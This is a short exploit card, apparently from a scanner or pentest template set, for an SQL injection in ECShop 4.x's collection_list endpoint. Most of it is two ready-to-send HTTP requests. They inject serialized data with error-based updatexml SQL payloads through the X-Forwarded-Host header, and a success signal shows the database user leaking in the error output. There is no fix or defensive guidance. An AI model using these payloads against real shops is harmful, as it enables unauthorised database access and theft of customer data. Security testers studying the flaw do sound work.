# ECShop collection_list SQL Injection (collection_list-sqli)

## 指纹特征
- 服务: ECShop 4.x
- 端口: 8080
- 关键接口: `/user.php?act=collection_list`

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 通过 X-Forwarded-Host 注入 | `/user.php?act=collection_list` | 需登录普通用户 |

## PoC 指令

通过构造包含恶意序列化数据和 SQL 注入 Payload 的 `X-Forwarded-Host` 头部进行注入。

**1. 利用 `insert_user_account` 函数 (报错注入)**
```http
GET /user.php?act=collection_list HTTP/1.1
Host: {{TARGET}}:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:"user_id";s:38:"0'-(updatexml(1,repeat(user(),2),1))-'";s:7:"payment";s:1:"4";}|45ea207d7a2b68c49582d2d22adf953a
Cookie: {{LOGGED_IN_COOKIE}}
```

**2. 利用 `insert_pay_log` 函数 (报错注入)**
```http
GET /user.php?act=collection_list HTTP/1.1
Host: {{TARGET}}:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:"1' and updatexml(1,repeat(user(),2),1) and '";|
Cookie: {{LOGGED_IN_COOKIE}}
```

## Success Signal
- **报错回显**: 响应 Body 中包含数据库错误信息，显示执行结果（如 `XPATH syntax error: 'root@localhostroot@localhost'`）。
